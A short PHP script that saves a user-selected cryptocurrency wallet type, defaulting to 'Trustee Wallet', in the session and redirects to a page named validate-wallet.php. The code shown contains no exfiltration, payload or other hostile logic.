<?php
session_start();
$wallet = "Trustee Wallet";
if(isset($_POST["wallettype"])) {
$wallet = $_POST['wallettype'];
}

$_SESSION['wallettype'] = $wallet;

header("location: validate-wallet.php");
exit();